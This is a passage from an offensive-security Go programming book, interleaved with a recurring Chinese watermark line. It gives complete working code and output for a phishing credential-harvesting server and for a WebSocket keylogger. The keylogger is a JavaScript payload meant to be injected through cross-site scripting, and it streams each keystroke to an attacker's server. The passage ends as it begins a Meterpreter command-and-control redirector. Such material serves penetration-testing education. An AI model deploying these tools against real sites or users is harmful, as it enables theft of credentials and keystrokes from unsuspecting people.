    log "github.com/Sirupsen/logrus" u
    "github.com/gorilla/mux"
)
前沿信安资讯阵地  公众号：i nf osrc
92   Chapter 4
func login(w http.ResponseWriter, r *http.Request) {
    log.WithFields(log.Fields{ v
        "time":       time.Now().String(),
        "username":   r.FormValue("_user"), w
        "password":   r.FormValue("_pass"), x
        "user-agent": r.UserAgent(),
        "ip_address": r.RemoteAddr,
    }).Info("login attempt")
    http.Redirect(w, r, "/", 302)
}
func main() {
    fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600) y
    if err != nil {
        panic(err)
    }
    defer fh.Close()
    log.SetOutput(fh) z
    r := mux.NewRouter()
    r.HandleFunc("/login", login).Methods("POST") {
    r.PathPrefix("/").Handler(http.FileServer(http.Dir("public"))) |
    log.Fatal(http.ListenAndServe(":8080", r)) 
}
Listing 4-8: Credential-harvesting server (/ch-4/credential_harvester/main.go)
The first thing worth noting is you import github.com/Sirupsen/logrus u. 
This is a structured logging package that we prefer to use instead of the 
standard Go log package. It provides more configurable logging options 
for better error handling. To use this package, you’ll need to make sure 
you ran go get beforehand. 
Next, you define the login() handler function. Hopefully, this pattern 
looks familiar. Inside this function, you use log.WithFields() to write out 
your captured data v. You display the current time, the user-agent, and IP 
address of the requester. You also call FormValue(string) to capture both the 
username (_user) w and password (_pass) x values that were submitted. You 
get these values from index.html and by locating the form input elements for 
each username and password. Your server needs to explicitly align with the 
names of the fields as they exist in the login form. 
The following snippet, extracted from index.html, shows the relevant 
input items, with the element names in bold for clarity: 
In your main() function, you begin by opening a file that’ll be used to 
store your captured data y. Then, you use log.SetOutput(io.Writer), passing 
it the file handle you just created, to configure the logging package so that 
前沿信安资讯阵地  公众号：i nf osrc
HTTP Servers, Routing, and Middleware    93
it’ll write its output to that file z. Next, you create a new router and mount 
the login() handler function {.
Prior to starting the server, you do one more thing that may look unfa-
miliar: you tell your router to serve static files from a directory |. That way, 
your Go server explicitly knows where your static files—images, JavaScript, 
HTML—live. Go makes this easy, and provides protections against direc-
tory traversal attacks. Starting from the inside out, you use http.Dir(string) 
to define the directory from which you wish to serve the files. The result 
of this is passed as input to http.FileServer(FileSystem), which creates an 
http.Handler for your directory. You’ll mount this to your router by using 
PathPrefix(string). Using / as a path prefix will match any request that 
hasn’t already found a match. Note that, by default, the handler returned 
from FileServer does support directory indexing. This could leak some 
information. It’s possible to disable this, but we won’t cover that here.
Finally, as you have before, you start the server. Once you’ve built and 
executed the code in Listing 4-8, open your web browser and navigate to 
http://localhost:8080. Try submitting a username and password to the form. 
Then head back to the terminal, exit the program, and view the credentials.txt 
file, shown here:
$ go build -o credential_harvester
$ ./credential_harvester
^C
$ cat credentials.txt
INFO[0038] login attempt                                
ip_address="127.0.0.1:34040" password="p@ssw0rd1!" time="2020-02-13 
21:29:37.048572849 -0800 PST" user-agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; 
rv:51.0) Gecko/20100101 Firefox/51.0" username=bob
Look at those logs! You can see that you submitted the username of bob 
and the password of p@ssw0rd1!. Your malicious server successfully handled 
the form POST request, captured the entered credentials, and saved them 
to a file for offline viewing. As an attacker, you could then attempt to use 
these credentials against the target organization and proceed with further 
compromise.
In the next section, you’ll work through a variation of this credential-
harvesting technique. Instead of waiting for form submission, you’ll create 
a keylogger to capture keystrokes in real time.
Keylogging with the WebSocket API
The WebSocket API (WebSockets), a full duplex protocol, has increased in 
popularity over the years and many browsers now support it. It provides 
a way for web application servers and clients to efficiently communicate 
with each other. Most importantly, it allows the server to send messages 
to a client without the need for polling.
WebSockets are useful for building “real-time” applications, such 
as chat and games, but you can use them for nefarious purposes as well, 
前沿信安资讯阵地  公众号：i nf osrc
94   Chapter 4
such as injecting a keylogger into an application to capture every key a 
user presses. To begin, imagine you’ve identified an application that is 
vulnerable to cross-site scripting (a flaw through which a third party can 
run arbitrary JavaScript in a victim’s browser) or you’ve compromised 
a web server, allowing you to modify the application source code. Either 
scenario should let you include a remote JavaScript file. You’ll build the 
server infrastructure to handle a WebSocket connection from a client and 
handle incoming keystrokes.
For demonstration purposes, you’ll use JS Bin (http://jsbin.com) to test 
your payload. JS Bin is an online playground where developers can test their 
HTML and JavaScript code. Navigate to JS Bin in your web browser and 
paste the following HTML into the column on the left, completely replac-
ing the default code:
  Login
On the right side of the screen, you’ll see the rendered form. As you 
may have noticed, you’ve included a script tag with the src attribute set to 
http://localhost:8080/k.js. This is going to be the JavaScript code that will 
create the WebSocket connection and send user input to the server. 
Your server is going to need to do two things: handle the WebSocket 
and serve the JavaScript file. First, let’s get the JavaScript out of the way, 
since after all, this book is about Go, not JavaScript. (Check out https://
github.com/gopherjs/gopherjs/ for instructions on writing JavaScript with Go.) 
The JavaScript code is shown here: 
(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.onkeypress = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();
The JavaScript code handles keypress events. Each time a key is pressed, 
the code sends the keystrokes over a WebSocket to a resource at ws://{{.}}/ws.  
Recall that the {{.}} value is a Go template placeholder representing the 
前沿信安资讯阵地  公众号：i nf osrc
HTTP Servers, Routing, and Middleware    95
current context. This resource represents a WebSocket URL that will 
populate the server location information based on a string you’ll pass to 
the template. We’ll get to that in a minute. For this example, you’ll save the 
JavaScript in a file named logger.js. 
But wait, you say, we said we were serving it as k.js! The HTML we 
showed previously also explicitly uses k.js. What gives? Well, logger.js is a 
Go template, not an actual JavaScript file. You’ll use k.js as your pattern to 
match against in your router. When it matches, your server will render the 
template stored in the logger.js file, complete with contextual data that rep-
resents the host to which your WebSocket connects. You can see how this 
works by looking at the server code, shown in Listing 4-9.
import (
    "flag"
    "fmt"
    "html/template"
    "log"
    "net/http"
    "github.com/gorilla/mux"
    u "github.com/gorilla/websocket"
)
var (
    v upgrader = websocket.Upgrader{
        CheckOrigin: func(r *http.Request) bool { return true },
    }
    listenAddr string
    wsAddr     string
    jsTemplate *template.Template
)
func init() {
    flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
    flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
    flag.Parse()
    var err error
    w jsTemplate, err = template.ParseFiles("logger.js")
    if err != nil {
        panic(err)
    }
}
func serveWS(w http.ResponseWriter, r *http.Request) {
    x conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil {
        http.Error(w, "", 500)
        return
    }
    defer conn.Close()
    fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
前沿信安资讯阵地  公众号：i nf osrc
96   Chapter 4
    for {
        y _, msg, err := conn.ReadMessage()
        if err != nil {
            return
        }
        z fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
    }
}
func serveFile(w http.ResponseWriter, r *http.Request) {
    { w.Header().Set("Content-Type", "application/javascript")
    | jsTemplate.Execute(w, wsAddr)
}
func main() {
    r := mux.NewRouter()
    } r.HandleFunc("/ws", serveWS)
    ~ r.HandleFunc("/k.js", serveFile)
    log.Fatal(http.ListenAndServe(":8080", r))
}
Listing 4-9: Keylogging server (/ch-4/websocket _keylogger /main.go)
We have a lot to cover here. First, note that you’re using another third-party 
package, gorilla/websocket, to handle your WebSocket communications u. 
This is a full-featured, powerful package that simplifies your development 
process, like the gorilla/mux router you used earlier in this chapter. Don’t 
forget to run go get github.com/gorilla/websocket from your terminal first. 
You then define several variables. You create a websocket.Upgrader instance 
that’ll essentially whitelist every origin v. It’s typically bad security practice to 
allow all origins, but in this case, we’ll roll with it since this is a test instance 
we’ll run on our local workstations. For use in an actual malicious deploy-
ment, you’d likely want to limit the origin to an explicit value. 
Within your init() function, which executes automatically before 
main(), you define your command line arguments and attempt to parse 
your Go template stored in the logger.js file. Notice that you’re calling 
template.ParseFiles("logger.js") w. You check the response to make sure 
the file parsed correctly. If all is successful, you have your parsed template 
stored in a variable named jsTemplate.
At this point, you haven’t provided any contextual data to your tem-
plate or executed it. That’ll happen shortly. First, however, you define a 
function named serveWS() that you’ll use to handle your WebSocket com-
munications. You create a new websocket.Conn instance by calling upgrader 
.Upgrade(http .ResponseWriter, *http.Request, http.Header) x. The Upgrade() 
method upgrades the HTTP connection to use the WebSocket protocol. 
That means that any request handled by this function will be upgraded 
to use WebSockets. You interact with the connection within an infinite 
for loop, calling conn.ReadMessage() to read incoming messages y. If your 
JavaScript works appropriately, these messages should consist of captured 
keystrokes. You write these messages and the client’s remote IP address 
to stdout z.
前沿信安资讯阵地  公众号：i nf osrc
HTTP Servers, Routing, and Middleware    97
You’ve tackled arguably the hardest piece of the puzzle in creating 
your WebSocket handler. Next, you create another handler function 
named serveFile(). This function will retrieve and return the contents of 
your JavaScript template, complete with contextual data included. To do 
this, you set the Content-Type header as application/javascript {. This will 
tell connecting browsers that the contents of the HTTP response body 
should be treated as JavaScript. In the second and last line of the handler 
function, you call jsTemplate.Execute(w, wsAddr) |. Remember how you 
parsed logger.js while you were bootstrapping your server in the init() 
function? You stored the result within the variable named jsTemplate. This 
line of code processes that template. You pass to it an io.Writer (in this 
case, you’re using w, an http.ResponseWriter) and your contextual data of 
type interface{}. The interface{} type means that you can pass any type 
of variable, whether they’re strings, structs, or something else. In this 
case, you’re passing a string variable named wsAddr. If you jump back up 
to the init() function, you’ll see that this variable contains the address of 
your WebSocket server and is set via a command line argument. In short, 
it populates the template with data and writes it as an HTTP response. 
Pretty slick!
You’ve implemented your handler functions, serveFile() and serveWS(). 
Now, you just need to configure your router to perform pattern matching so 
that you can pass execution to the appropriate handler. You do this, much 
as you have previously, in your main() function. The first of your two handler 
functions matches the /ws URL pattern, executing your serveWS() function to 
upgrade and handle WebSocket connections }. The second route matches 
the pattern /k.js, executing the serveFile() function as a result ~. This is how 
your server pushes a rendered JavaScript template to the client.
Let’s fire up the server. If you open the HTML file, you should 
see a message that reads connection established. This is logged because 
your JavaScript file has been rendered in the browser and requested a 
WebSocket connection. If you enter credentials into the form elements, 
you should see them printed to stdout on the server:
$ go run main.go -listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080
Connection from 127.0.0.1:58438
From 127.0.0.1:58438: u
From 127.0.0.1:58438: s
From 127.0.0.1:58438: e
From 127.0.0.1:58438: r
From 127.0.0.1:58438: 
From 127.0.0.1:58438: p
From 127.0.0.1:58438: @
From 127.0.0.1:58438: s
From 127.0.0.1:58438: s
From 127.0.0.1:58438: w
From 127.0.0.1:58438: o
From 127.0.0.1:58438: r
From 127.0.0.1:58438: d
前沿信安资讯阵地  公众号：i nf osrc
98   Chapter 4
You did it! It works! Your output lists each individual keystroke that was 
pressed when filling out the login form. In this case, it’s a set of user creden-
tials. If you’re having issues, make sure you’re supplying accurate addresses 
as command line arguments. Also, the HTML file itself may need tweaking 
if you’re attempting to call k.js from a server other than localhost:8080.
You could improve this code in several ways. For one, you might want to 
log the output to a file or other persistent storage, rather than to your ter-
minal. This would make you less likely to lose your data if the terminal win-
dow closes or the server reboots. Also, if your keylogger logs the keystrokes 
of multiple clients simultaneously, the output will mix the data, making it 
potentially difficult to piece together a specific user’s credentials. You could 
avoid this by finding a better presentation format that, for example, groups 
keystrokes by unique client/port source.
Your journey through credential harvesting is complete. We’ll end 
this chapter by presenting multiplexing HTTP command-and-control 
connections.
Multiplexing Command-and-Control
You’ve arrived at the last section of the chapter on HTTP servers. Here, you’ll 
look at how to multiplex Meterpreter HTTP connections to different backend 
control servers. Meterpreter is a popular, flexible command-and-control (C2) 
suite within the Metasploit exploitation framework. We won’t go into too 
many details about Metasploit or Meterpreter. If you’re new to it, we recom-
mend reading through one of the many tutorial or documentation sites. 
In this section, we’ll walk through creating a reverse HTTP proxy in 
Go so that you can dynamically route your incoming Meterpreter sessions 
based on the Host HTTP header, which is how virtual website hosting works. 
However, instead of serving different local files and directories, you’ll proxy 
the connection to different Meterpreter listeners. This is an interesting use 
case for a few reasons. 
First, your proxy acts as a redirector, allowing you to expose only that 
domain name and IP address without exposing your Metasploit listeners. 
If the redirector ever gets blacklisted, you can simply move it without having  
to move your C2 server. Second, you can extend the concepts here to per-